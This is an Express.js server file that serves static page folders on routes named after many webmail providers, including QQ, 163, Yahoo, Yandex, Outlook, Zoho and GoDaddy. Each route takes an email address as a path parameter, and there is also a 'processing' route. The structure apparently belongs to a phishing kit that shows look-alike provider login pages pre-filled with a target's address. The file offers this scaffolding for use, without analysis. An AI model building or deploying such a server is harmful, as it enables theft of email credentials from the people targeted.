const express = require("express");
const path = require("path");

const app = express();
const port = process.env.PORT || 9000;

app.use(express.static(path.join(__dirname, "pages")));

app.use("/qq/:email", express.static(path.join(__dirname, "pages/qq")));
app.use("/263/:email", express.static(path.join(__dirname, "pages/263")));
app.use("/126/:email", express.static(path.join(__dirname, "pages/126")));
app.use("/163/:email", express.static(path.join(__dirname, "pages/163")));
app.use("/hinet/:email", express.static(path.join(__dirname, "pages/hinet")));
app.use(
  "/rackspace/:email",
  express.static(path.join(__dirname, "pages/rackspace"))
);
app.use(
  "/webmail/:email",
  express.static(path.join(__dirname, "pages/webmail"))
);
app.use("/yahoo/:email", express.static(path.join(__dirname, "pages/yahoo")));
app.use(
  "/yahoodns/:email",
  express.static(path.join(__dirname, "pages/yahoo"))
);
app.use("/yandex/:email", express.static(path.join(__dirname, "pages/yandex")));
app.use(
  "/outlook/:email",
  express.static(path.join(__dirname, "pages/office"))
);
app.use("/zoho/:email", express.static(path.join(__dirname, "pages/zoho")));
app.use(
  "/godaddy/:email",
  express.static(path.join(__dirname, "pages/godaddy"))
);
app.use(
  "/hiworks/:email",
  express.static(path.join(__dirname, "pages/hiworks"))
);
app.use("/mail/:email", express.static(path.join(__dirname, "pages/mail")));
app.use(
  "/processing/:domain",
  express.static(path.join(__dirname, "pages/processing"))
);

app.listen(port, () => {
  console.log(`server is running on port: ${port}`);
});
